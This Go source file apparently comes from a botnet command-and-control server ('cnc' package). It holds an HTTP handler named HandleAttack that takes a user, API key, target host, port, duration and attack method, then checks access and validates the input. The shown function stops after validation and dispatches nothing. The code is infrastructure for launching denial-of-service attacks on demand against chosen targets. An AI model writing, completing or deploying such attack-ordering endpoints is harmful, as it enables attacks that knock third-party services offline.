package api

import (
	"cnc/internal/util"
	"encoding/json"
	"net/http"
	"strconv"
)

type AttackResponse struct {
	Success bool   `json:"success"`
	Message string `json:"message"`
	Details string `json:"details,omitempty"`
}

func HandleAttack(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != "GET" {
		response := AttackResponse{
			Success: false,
			Message: "Method not allowed",
		}
		w.WriteHeader(http.StatusMethodNotAllowed)
		json.NewEncoder(w).Encode(response)
		return
	}

	query := r.URL.Query()
	userStr := query.Get("user")
	apiKey := query.Get("apikey")
	host := query.Get("host")
	portStr := query.Get("port")
	timeStr := query.Get("time")
	method := query.Get("method")

	if userStr == "" || apiKey == "" || host == "" || portStr == "" || timeStr == "" || method == "" {
		response := AttackResponse{
			Success: false,
			Message: "Missing required parameters: user, apikey, host, port, time, method",
		}
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(response)
		return
	}

	if !util.ApiAccess(userStr) {
		response := AttackResponse{
			Success: false,
			Message: "API access is disabled",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	if !util.CheckAPIKey(userStr, apiKey) {
		response := AttackResponse{
			Success: false,
			Message: "Invalid API key",
		}
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(response)
		return
	}

	timeVal, err := strconv.Atoi(timeStr)
	if err != nil || timeVal <= 0 {
		response := AttackResponse{
			Success: false,
			Message: "Invalid time parameter",
		}
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(response)
		return
	}

	
}
